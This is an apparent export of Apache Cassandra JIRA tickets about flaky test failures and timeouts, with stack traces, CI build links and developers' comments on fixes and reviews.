|trunk|MixedModeAvailabilityV3XAllOneTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1823/workflows/22c61e48-3652-4ea2-8b5a-c833bbd3c30c]|
|trunk|MixedModeAvailabilityV3XOneAllTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1824/workflows/7f57d021-6251-47f7-8d40-678698ffa727]|

All of them pass, except the one for {{MixedModeAvailabilityV3XQuorumQuorumTest}}. It has hit a different error that seems related to cluster shutdown. Not sure whether we should try to address that issue here or proceed with this test splitting as it is.;;;","02/Jul/22 15:56;adelapena;It seems there was a mistake on the way that exceptions are handled on the test, I've just fixed that too. With that and the splitting it survives 400 iterations on every split:
||branch||test||CI||
|4.1|MixedModeAvailabilityV30QuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1891/workflows/f862c7b3-39f8-4c71-8d0b-072013209550]|
|4.1|MixedModeAvailabilityV30AllOneTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1892/workflows/f82825f4-7297-4209-896f-743c71258f17]|
|4.1|MixedModeAvailabilityV30OneAllTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1893/workflows/c973a92f-03f3-4dea-90da-cd425b303c36]|
|4.1|MixedModeAvailabilityV3XQuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1894/workflows/57b2354a-548d-4d8f-ac82-cf13227aafb3]|
|4.1|MixedModeAvailabilityV3XAllOneTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1895/workflows/1398d736-bd48-47e9-baa2-2f791ace0a67]|
|4.1|MixedModeAvailabilityV3XOneAllTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1896/workflows/82499604-63c2-4b3a-a89f-dc352447ebb5]|
|trunk|MixedModeAvailabilityV30QuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1897/workflows/513e1cfc-1822-4f70-8fb9-01a6aabe5915]|
|trunk|MixedModeAvailabilityV30AllOneTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1898/workflows/9d2dafbf-0ebc-4ca5-a372-41620202ccfa]|
|trunk|MixedModeAvailabilityV30OneAllTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1899/workflows/523dba84-f680-439d-ab02-f6bd2666d296]|
|trunk|MixedModeAvailabilityV3XQuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1900/workflows/029384e6-be31-4c5e-8bea-a432c9437bb3]|
|trunk|MixedModeAvailabilityV3XAllOneTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1901/workflows/7b55c969-2ad0-40df-9408-8c70e368cc21]|
|trunk|MixedModeAvailabilityV3XOneAllTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1902/workflows/5e01a6bb-973d-4e4c-a94c-0e18b6af4e97]|;;;","05/Jul/22 05:16;bereng;LGTM +1;;;","05/Jul/22 11:33;adelapena;Committed to 4.1 as [91d08e496ee439a2179e617f4db8804ab07c301a|https://github.com/apache/cassandra/commit/91d08e496ee439a2179e617f4db8804ab07c301a] and merged into [trunk|https://github.com/apache/cassandra/commit/5616675b1fa7d5b979c0d345ea5f3a3182f6c2d7].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_parallel_upgrade,CASSANDRA-17306,13425003,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,jmckenzie,jmckenzie,26/Jan/22 18:07,25/May/22 05:44,13/Jul/23 08:40,24/May/22 10:37,,,,,,,Test/dtest/python,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-4.0/320/testReport/dtest-upgrade.upgrade_tests.upgrade_through_versions_test/TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X/test_parallel_upgrade/

Failed 2 times in the last 30 runs. Flakiness: 6%, Stability: 93%
Error Message
test teardown failure

{code}
Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [WARN  [MessagingService-Incoming-/127.0.0.1] 2022-01-25 18:46:40,431 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing
org.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles.  If the table was just created, this is likely due to the schema not being fully propagated.  Please wait for schema agreement on table creation.
	at org.apache.cassandra.db.SliceFromReadCommandSerializer.deserialize(SliceFromReadCommand.java:184) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:158) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:132) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.MessageIn.read(MessageIn.java:99) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:200) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:177) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:91) ~[apache-cassandra-2.2.19.jar:2.2.19], WARN  [MessagingService-Incoming-/127.0.0.1] 2022-01-25 18:46:40,431 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing
org.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles.  If the table was just created, this is likely due to the schema not being fully propagated.  Please wait for schema agreement on table creation.
	at org.apache.cassandra.db.SliceFromReadCommandSerializer.deserialize(SliceFromReadCommand.java:184) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:158) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:132) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.MessageIn.read(MessageIn.java:99) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:200) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:177) ~[apache-cassandra-2.2.19.jar:2.2.19]
	at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:91) ~[apache-cassandra-2.2.19.jar:2.2.19]]
{code}",,bereng,jmckenzie,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17629,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,brandon.williams,,,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 24 10:37:56 UTC 2022,,,,,,,All,,,,"0|z0yzhc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,"24/May/22 10:05;bereng;[~brandon.williams] propsing to close this one as duplicate of CASSANDRA-17629. Do you agree?
- They seem to have the same root cause
- Since that fix was merged this test only failed bc of timeouts
- Makes sense as this test also uses the same file that was fixed;;;","24/May/22 10:37;brandon.williams;Yes, closing as dupe.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: dtest-offheap.topology_test.TestTopology.test_decommissioned_node_cant_rejoin,CASSANDRA-17302,13424994,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,jmckenzie,jmckenzie,26/Jan/22 17:55,26/May/23 11:51,13/Jul/23 08:40,26/May/23 11:42,3.0.30,3.11.16,4.0.10,4.1.2,5.0,,Test/dtest/python,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-4.0/317/testReport/dtest-offheap.topology_test/TestTopology/test_decommissioned_node_cant_rejoin/

Failed 1 times in the last 20 runs. Flakiness: 5%, Stability: 95%

Error Message
AssertionError: assert None  +  where None = <function search at 0x7f0de9492c10>('This node was decommissioned and will not rejoin the ring', '', re.MULTILINE)  +    where <function search at 0x7f0de9492c10> = re.search  +    and   '' = <built-in method join of str object at 0x7f0de963b4b0>([])  +      where <built-in method join of str object at 0x7f0de963b4b0> = '\n'.join  +    and   re.MULTILINE = re.MULTILINE

{code}
Stacktrace
self = <topology_test.TestTopology object at 0x7f0de5899430>

    @since('3.0')
    def test_decommissioned_node_cant_rejoin(self):
        """"""
            @jira_ticket CASSANDRA-8801
    
            Test that a decommissioned node can't rejoin the cluster by:
    
            - creating a cluster,
            - decommissioning a node, and
            - asserting that the ""decommissioned node won't rejoin"" error is in the
            logs for that node and
            - asserting that the node is not running.
            """"""
        rejoin_err = 'This node was decommissioned and will not rejoin the ring'
        self.fixture_dtest_setup.ignore_log_patterns = list(self.fixture_dtest_setup.ignore_log_patterns) + [
            rejoin_err]
    
        self.cluster.populate(3).start()
        node1, node2, node3 = self.cluster.nodelist()
    
        logger.debug('decommissioning...')
        node3.decommission(force=self.cluster.version() >= '4.0')
        logger.debug('stopping...')
        node3.stop()
        logger.debug('attempting restart...')
        node3.start(wait_other_notice=False)
        try:
            # usually takes 3 seconds, so give it a generous 15
            node3.watch_log_for(rejoin_err, timeout=15)
        except TimeoutError:
            # TimeoutError is not very helpful to the reader of the test output;
            # let that pass and move on to string assertion below
            pass
    
>       assert re.search(rejoin_err,
                         '\n'.join(['\n'.join(err_list) for err_list in node3.grep_log_for_errors()]), re.MULTILINE)
E       AssertionError: assert None
E        +  where None = <function search at 0x7f0de9492c10>('This node was decommissioned and will not rejoin the ring', '', re.MULTILINE)
E        +    where <function search at 0x7f0de9492c10> = re.search
E        +    and   '' = <built-in method join of str object at 0x7f0de963b4b0>([])
E        +      where <built-in method join of str object at 0x7f0de963b4b0> = '\n'.join
E        +    and   re.MULTILINE = re.MULTILINE

topology_test.py:416: AssertionError
{code}",,bereng,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 26 11:42:20 UTC 2023,,,,,,,All,,,,"0|z0yzfc:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/396f2368e6fa330b6212aeb85363d0e53b5cff78,,,,,,,,,run CI,,,,,"17/Apr/23 21:13;e.dimitrova;Seen also here [https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/2416/tests];;;","25/May/23 20:11;brandon.williams;This is actually a timeout (which explains why both instances were on jenkins) but the code is trying to be helpful and already catches timeouts, trying to improve the error returned later, but sometimes there is no error, it's just a timeout, and that results in the assertion above.  I have reworked this to catch the case of a timeout and nothing else to rethrow a timeout error explaining what happened [here|https://github.com/driftx/cassandra-dtest/commit/876e93d2052d6f6420915747a4d21f020722edf0] and multiplexed the test [here|https://app.circleci.com/pipelines/github/driftx/cassandra/1028/workflows/2c56fe0f-37e7-48f2-b563-73772275b6dd/jobs/26975] but unfortunately never hit a timeout.

;;;","26/May/23 06:15;bereng;If it doesn't repro just repro your hypothesis locally. Force the code to throw and see it handles it as expected. I did locally and it worked for me so +1 :-);;;","26/May/23 11:42;brandon.williams;Thanks :) Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.net.ProxyHandlerConnectionsTest.suddenDisconnect-cdc,CASSANDRA-17301,13424991,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,jmckenzie,jmckenzie,26/Jan/22 17:49,05/Oct/22 22:22,13/Jul/23 08:40,21/Jun/22 01:21,4.0.5,4.1,4.1-beta1,,,,Test/unit,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-4.0/316/testReport/org.apache.cassandra.net/ProxyHandlerConnectionsTest/suddenDisconnect_cdc/

See same failure on org.apache.cassandra.net.ProxyHandlerConnectionsTest.suddenDisconnect-compression as well

Failed 1 times in the last 11 runs. Flakiness: 10%, Stability: 90%

{code}
Stacktrace
java.util.concurrent.TimeoutException
	at java.base/java.util.concurrent.CompletableFuture.timedGet(CompletableFuture.java:1886)
	at java.base/java.util.concurrent.CompletableFuture.get(CompletableFuture.java:2021)
	at org.apache.cassandra.net.ProxyHandlerConnectionsTest.waitForCondition(ProxyHandlerConnectionsTest.java:279)
	at org.apache.cassandra.net.ProxyHandlerConnectionsTest.lambda$suddenDisconnect$29(ProxyHandlerConnectionsTest.java:237)
	at org.apache.cassandra.net.ProxyHandlerConnectionsTest.doTestManual(ProxyHandlerConnectionsTest.java:385)
	at org.apache.cassandra.net.ProxyHandlerConnectionsTest.testManual(ProxyHandlerConnectionsTest.java:344)
	at org.apache.cassandra.net.ProxyHandlerConnectionsTest.suddenDisconnect(ProxyHandlerConnectionsTest.java:225)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
Standard Output
DEBUG [main] 2022-01-23 13:09:13,779 InternalLoggerFactory.java:63 - Using SLF4J as the default logging framework
DEBUG [main] 2022-01-23 13:09:13,805 PlatformDependent0.java:417 - -Dio.netty.noUnsafe: false
DEBUG [main] 2022-01-23 13:09:13,805 PlatformDependent0.java:897 - Java version: 8
DEBUG [main] 2022-01-23 13:09:13,807 PlatformDependent0.java:130 - sun.misc.Unsafe.theUnsafe: available
DEBUG [main] 2022-01-23 13:09:13,808 PlatformDependent0.java:154 - sun.misc.Unsafe.copyMemory: available

...[truncated 417667 chars]...
ol$Initiate.maybeDecode(HandshakeProtocol.java:167)
	at org.apache.cassandra.net.InboundConnectionInitiator$Handler.initiate(InboundConnectionInitiator.java:242)
	at org.apache.cassandra.net.InboundConnectionInitiator$Handler.decode(InboundConnectionInitiator.java:235)
	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:508)
	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:447)
	... 29 common frames omitted
{code}",,bereng,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 27 16:49:52 UTC 2022,,,,,,,All,,,,"0|z0yzeo:",9223372036854775807,,,,bereng,,,,Normal,,,,c8481836e6aeacef8041d9c790cc2cb138232877,,,,,,,,,The test is not reproducible in CircleCI or locally but fails regularly in Jenkins so running CI on all three branches In Jenkins sounds like a first step and we will keep on monitoring if any timeout pops up again to reopen the ticket,,,,,"08/Jun/22 13:31;e.dimitrova;This seems like a timeout issue.

I don't see it failing in Butler in 4.0, only 4.1 and trunk and I cannot reproduce in CircleCI. Locally it fails with super significant decrease of the timeout  [here|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/net/ProxyHandlerConnectionsTest.java#L279]

My suggestion is to increase the timeout to 1 minutes and monitor how Jenkins behaves. It has so many issues lately that I think it was just lagging a lot.

[4.0|https://github.com/ekaterinadimitrova2/cassandra/commit/35949190397239bf25863c0c36dfdad6f686a048] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1776/]

[4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/c7692fce558fbb136d62d0db3bd96e7b05196a19] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1777/] (pending start)

[trunk|https://github.com/ekaterinadimitrova2/cassandra/commit/6f425c17a8ba1f61b394769847dbb8e11c0a0502] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1776/]  (pending start);;;","08/Jun/22 13:41;e.dimitrova;There is some issue with Jenkins plugins to. fetch my branches....bad day for Jenkins. I will resubmit again tomorrow morning, hopefully it will have a better day. ;;;","09/Jun/22 07:16;e.dimitrova;Seems there was an issue with one of the branches in my repo during git fetch. Deleted the branch and now the things seems to work.

This seems like a timeout issue.

I don't see it failing in Butler in 4.0, only 4.1 and trunk and I cannot reproduce in CircleCI.

[4.0|https://github.com/ekaterinadimitrova2/cassandra/commit/35949190397239bf25863c0c36dfdad6f686a048] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1780/]

[4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/c7692fce558fbb136d62d0db3bd96e7b05196a19] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1781/]

-[trunk|https://github.com/ekaterinadimitrova2/cassandra/commit/6f425c17a8ba1f61b394769847dbb8e11c0a0502] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1782/]  (pending start)-

EDIT: There are some issues with Jenkins, full disk, etc. arm fails because of java doc which I didn't touch.... But the test in scope didn't seem to fail on any of the three branches so pushing for review.

Re-running trunk as it went to 60 failures because of all issues yesterday:

[trunk|https://github.com/ekaterinadimitrova2/cassandra/commit/6f425c17a8ba1f61b394769847dbb8e11c0a0502] | [Jenkins|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1790/] (pending start, there are already two builds across all nodes);;;","13/Jun/22 10:12;bereng;+1 LGTM. It's difficult to navigate jenkins status these days but I don't see how this could affect it. Let's raise it and we can reopen if it reapears one day.;;;","13/Jun/22 16:17;e.dimitrova;Thanks, I don't see it on the last trunk CI run too. 

I can commit it tomorrow (having very bad internet where I am now, I don't want to get interrupted in the middle of a commit);;;","20/Jun/22 17:06;e.dimitrova;Rebased the branches and started the unit tests for quick sanity check:

4.0 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1728/workflows/a692528c-eeb1-458b-a456-6caba2b745ea], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1728/workflows/4b8b9a53-e95e-41d8-9f72-8ef0bb41ed40]

4.1 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1729/workflows/b266347c-cb5f-4da0-8a8b-bca916b1184e], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1729/workflows/457a521a-9f68-4171-91f0-1935623554e6]

trunk - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1730/workflows/53651f21-eb51-47fc-b974-c5fe17380701], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1730/workflows/2c623dea-e578-409e-b98f-d166cfa6a665];;;","21/Jun/22 01:19;e.dimitrova;All tests completed successfully. Patch committed:

15ecaaed43..c8481836e6  cassandra-4.0 -> cassandra-4.0

   e50e2e93fb..b283f0602e  cassandra-4.1 -> cassandra-4.1

   53490acf65..2c7f021c56  trunk -> trunk;;;","27/Jun/22 16:49;jmckenzie;[CI Results]
Branch: 4.1, build number: 74
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/74/
   JIRA: CASSANDRA-17301
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=c8481836e6aeacef8041d9c790cc2cb138232877
   affected paths:
* test/unit/org/apache/cassandra/net/ProxyHandlerConnectionsTest.java

   Build Result: UNSTABLE
   Passing Tests: 46567
   Failing Tests: 19

||Test|Failures|JIRA||
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|18 of 71|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|org.apache.cassandra.cql3.ViewFilteringClustering1Test.testClusteringKeySliceRestrictions[3]|12 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn|4 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnRegularColumnInsertExpiringColumnWithFlush|7 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.SchemaTest.readRepair|16 of 71|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|dtest.repair_tests.incremental_repair_test.TestIncRepair.test_multiple_repair|3 of 71|[CASSANDRA-11268?|https://issues.apache.org/jira/browse/CASSANDRA-11268]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnPartitionKeyInsertExpiringColumn|5 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.CompactStorageImplicitNullInClusteringTest.testImplicitNullInClusteringWithCompactStorage|3 of 71|[CASSANDRA-17642?|https://issues.apache.org/jira/browse/CASSANDRA-17642]|
|org.apache.cassandra.cql3.ViewFilteringClustering1Test.terminated successfully|3 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|7 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|6 of 71|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|21 of 71|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|
|org.apache.cassandra.cql3.ViewFilteringSimplePKTest.testPartitionKeyFilteringWithSlice[3]|3 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|11 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.operations.SelectTest.testAllowFilteringOnPartitionKey|2 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|13 of 71|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: unit test compression: testTokenGenerator_single_rack_or_single_rf,CASSANDRA-17291,13424738,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,25/Jan/22 16:45,27/May/22 19:25,13/Jul/23 08:40,23/May/22 17:03,4.0.5,4.1,4.1-alpha1,,,,Test/unit,,,,1,,"org.apache.cassandra.dht.tokenallocator.OfflineTokenAllocatorTest

[https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/168/workflows/1d30a113-c14b-4cf4-a631-bedb9eb65762/jobs/1447]

Looks like a pretty simple / straightforward timeout

 {code}
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at org.apache.cassandra.anttasks.TestHelper.execute(TestHelper.java:53)
	at java.util.Vector.forEach(Vector.java:1277)
{code}

 ",,bereng,dcapwell,e.dimitrova,jmckenzie,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 24 14:42:54 UTC 2022,,,,,,,All,,,,"0|z0yxug:",9223372036854775807,,,,dcapwell,jmckenzie,,,Normal,,4.0.4,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=951aff25a1183f41fd146d674136399f3f25b3f0",,,,,,,,,Revised unit testing,,,,,"28/Mar/22 13:24;e.dimitrova;[~jmckenzie] , I was wondering what is the reason to leave in triage some of the test failures tickets like this one? Did you think it needs further testing and it might have been random failure? 

I am opening this one as I see it consistently failing in CircleCI. Also, my understanding is that we use the offline token allocator for the Python DTests so it is good to verify there is no real problem there.

CC [~mck] ;;;","28/Mar/22 13:35;jmckenzie;Just missed hitting open when creating as build lead. Not intentional.;;;","16/May/22 16:04;jmckenzie;100 runs on JDK8 w/this passing in circle; going to try 100 on JDK11 then maybe up the repeat count.;;;","16/May/22 16:30;e.dimitrova;I see it almost all the time with MIDRES in CircleCI ;;;","16/May/22 17:08;jmckenzie;Yeah, this is somewhat odd. using `generate.sh` to multiplex it it doesn't look like it's showing up; may have something to do with timing and other tests parallelizing and sharing state and stomping each other.

 

I assume generate.sh is going to keep provisioning at the effectively ""LOWRES"" footprint on hardware alloc right?;;;","17/May/22 08:05;bereng;generate.sh accepts flags for medium, high, etc. See [here|https://github.com/apache/cassandra/tree/trunk/.circleci#setting-environment-variables] i.e.;;;","17/May/22 15:36;jmckenzie;bq. generate.sh accepts flags for medium, high, etc. See here i.e.
Indeed. And when you don't run it with a flag it stays at the default, which in this case is LOWRES.;;;","17/May/22 16:55;e.dimitrova;Yes, and I checked currently LOWRES and MIDRES use the same resources for unit tests in particular.

I ran this one  500 times, the whole class in  [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1622/workflows/b69d6e45-b012-4fc7-a839-7320b86a319f/jobs/11106/steps] and weirdly it doesn't reproduce. But then I see it all the time in my MIDRES runs.

I will experiment a bit more. 

 ;;;","19/May/22 19:29;jmckenzie;Ok. So this was annoying but I think I got to the bottom of it.

[PR|https://github.com/apache/cassandra/pull/1638]
[JDK8 CI|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/232/workflows/6c742dd9-e1b3-4056-aac8-9f0b95ae4e84]
[JDK11 CI|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/232/workflows/5fcce28f-a258-485f-906e-45957c2b3b08]

The offending bit of code:
{code:java}
        for (int numTokens = 1; numTokens <= 16 ; ++numTokens)
        {
            for (int rf = 1; rf <=5; ++rf)
            {
                int nodeCount = 32;
                for (int racks = 1; racks <= 10; ++racks)
                {
                    int[] nodeToRack = makeRackCountArray(nodeCount, racks);
                    for (IPartitioner partitioner : new IPartitioner[] { Murmur3Partitioner.instance, RandomPartitioner.instance })
                    {
{code}
